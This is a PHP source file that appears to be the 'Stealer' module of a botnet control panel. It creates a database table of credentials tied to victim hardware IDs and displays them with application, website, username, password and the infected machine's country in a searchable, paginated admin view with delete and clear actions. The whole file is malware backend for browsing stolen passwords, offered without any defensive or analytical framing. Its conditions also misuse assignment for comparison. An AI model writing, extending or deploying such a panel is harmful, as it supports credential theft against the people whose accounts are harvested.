<?php
$TEMPLATE['site'] = "Stealer";

$install = false;
$TEMPLATE['text'] = '';
$TEMPLATE['js'] = '';
if (!db_table_exists('pwsafe_data'))
{
	db_query('CREATE TABLE IF NOT EXISTS `pwsafe_data` (
			`id` int(5) NOT NULL auto_increment,
			`hwid` varchar(65) NOT NULL default "",
			`app` varchar(65) NOT NULL default "",
			`website` varchar(65) NOT NULL default "",
			`user` varchar(65) NOT NULL default "",
			`pass` varchar(65) NOT NULL default "",
			`date` TIMESTAMP default CURRENT_TIMESTAMP,
			PRIMARY KEY (`id`)
			);');
	$TEMPLATE['text'] .= "Installed logs table.<br />";
	$install = true;
}
if (!$install)
{
	$TEMPLATE['text'] = '';
	if (isset($_GET['a']) && isset($_GET['id']) && $_GET['a'] = 'del')
	{
		db_query("DELETE FROM `pwsafe_data` WHERE `id` = :1", $_GET['id']);
		$TEMPLATE['text'] .= '<div class="alert alert-info">Deleted data.</div>';
	}
	elseif (isset($_GET['a']) && $_GET['a'] = 'clear')
	{
		db_query("TRUNCATE TABLE `pwsafe_data`");
		$TEMPLATE['text'] .= '<div class="alert alert-info">Cleared data.</div>';
	}


	$TEMPLATE['text'] .= '<form method="GET" role="form" class="form-inline">
							<input type="hidden" name="p" value="module" />
							<input type="hidden" name="m" value="Stealer" />
							<div class="form-group">
								<label class="sr-only" for="searchInput">Search...</label>
								<input type="text" class="form-control" id="searchInput" name="search" placeholder="Search...">
							</div>
							<button type="submit" class="btn btn-default">Search</button>
							<a class="btn btn-danger" href="?p=module&m=Stealer&a=clear"><i class="glyphicon glyphicon-trash"></i>&nbsp;Delete all Data</a>
						</form>
						<div style="height: 5px;"></div>
						<table class="table table-hover">
							<tr>
								<th>#</th>
								<th>HWID</th>
								<th>Country</th>
								<th>Application</th>
								<th>Website</th>
								<th>User</th>
								<th>Pass</th>
								<th>Date</th>
								<th></th>
							</tr>';
	$search = isset($_GET['search']) ? $_GET['search'] : 'x';
	$WHERE = isset($_GET['search']) ? "`website` LIKE concat('%', :1, '%')" : ':1 = :1';
	$LIMIT = isset($_GET['n']) ? sprintf("%d, %d", intval($_GET['n']), (intval($_GET['n']) + 10)) : '0, 10';
	$stmt = db_query("SELECT *, (SELECT `country` FROM `bots` WHERE `hwid` = `pwsafe_data`.`hwid`) AS `country` FROM `pwsafe_data` WHERE $WHERE LIMIT $LIMIT",
							$search);
	while ($row = $stmt->fetch())
	{
		$TEMPLATE['text'] .= "			<tr>
											<td>{$row['id']}</td>
											<td>{$row['hwid']}</td>
											<td>{$row['country']}</td>
											<td>{$row['app']}</td>
											<td>{$row['website']}</td>
											<td>{$row['user']}</td>
											<td>{$row['pass']}</td>
											<td>{$row['date']}</td>
											<td style=\"width: 100px;\">
												<a href=\"?p=module&m=Stealer&a=del&id={$row['id']}\" class=\"btn btn-danger\"><i class=\"glyphicon glyphicon-trash\"></i></a>
											</td>
										</tr>";
	}
	$TEMPLATE['text'] .= '</table>
						<div class="btn-group">
							<a href="?p=module&m=Stealer&n='.((isset($_GET['n']) && intval($_GET['n']) >= 10) ? intval($_GET['n']) - 10 : 0).'"><button type="button" class="btn btn-default">Back</button></a>
							<a><button type="button" class="btn btn-default">'.((isset($_GET['n']) && intval($_GET['n']) >= 10) ? (intval($_GET['n']) / 10 + 1) : 1).'</button></a>
							<a href="?p=module&m=Stealer&n='.(isset($_GET['n']) ? intval($_GET['n']) + 10 : 10).'"><button type="button" class="btn btn-default">Next</button></a>
						</div>';
			
			
	$TEMPLATE['js'] = '';
}
?>